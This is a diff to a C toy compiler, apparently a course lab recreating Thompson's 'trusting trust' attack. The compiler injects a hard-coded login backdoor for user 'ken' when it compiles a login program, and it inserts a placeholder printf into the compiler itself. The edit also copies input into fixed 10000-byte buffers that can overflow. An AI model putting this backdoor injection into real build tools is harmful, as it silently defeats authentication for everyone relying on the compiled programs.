@@ -31,12 +31,22 @@ static void compile(char *program, char *outname) {
     if (result != NULL) {
         int index = result - program + sig_length;
 
+        // Slice into two parts
+        char firstPart[10000];
+        char secondPart[10000];
+        strncpy(firstPart, program, index);
+        firstPart[index] = '\0';
+        strcpy(secondPart, program + index);
+        secondPart[strlen(program) - index] = '\0';
+
         // and inject an attack for "ken":
-        static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
-        int program_length = strlen(program);
-        int attack_length = strlen(login_attack);
-        memmove(program + index + attack_length, program + index, program_length - index + 1);
-        strncpy(program + index, login_attack, attack_length);
+        static char login_attack[] = "\nif(strcmp(user, \"ken\") == 0) return 1;\n";
+        fp = fopen("./temp-out.c", "w");
+        assert(fp);
+        fprintf(fp, "%s", firstPart);
+        fprintf(fp, "%s", login_attack);
+        fprintf(fp, "%s", secondPart);
+        fclose(fp);
     }
      
 
@@ -55,23 +65,27 @@ static void compile(char *program, char *outname) {
     if (compile_result != NULL) {
         int index = compile_result - program + compile_sig_length;
 
+        // Slice into two parts
+        char firstPart[10000];
+        char secondPart[10000];
+        strncpy(firstPart, program, index);
+        firstPart[index] = '\0';
+        strcpy(secondPart, program + index);
+        secondPart[strlen(program) - index] = '\0';
+
         // and inject a placeholder "attack":
         // inject this after the assert above after the call to fopen.
         // not much of an attack.   this is just a quick placeholder.
+        // and inject an attack for "ken":
         static char compile_attack[] 
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
-        int program_length = strlen(program);
-        int attack_length = strlen(compile_attack);
-        memmove(program + index + attack_length, program + index, program_length - index + 1);
-        strncpy(program + index, compile_attack, attack_length);
+        fp = fopen("./temp-out.c", "w");
+        assert(fp);
+        fprintf(fp, "%s", firstPart);
+        fprintf(fp, "%s", compile_attack);
+        fprintf(fp, "%s", secondPart);
+        fclose(fp);
     }
-
-    // Reinject it back into the code
-    fp = fopen("./temp-out.c", "w");
-    assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
-
 
     /************************************************************
      * don't modify the rest.
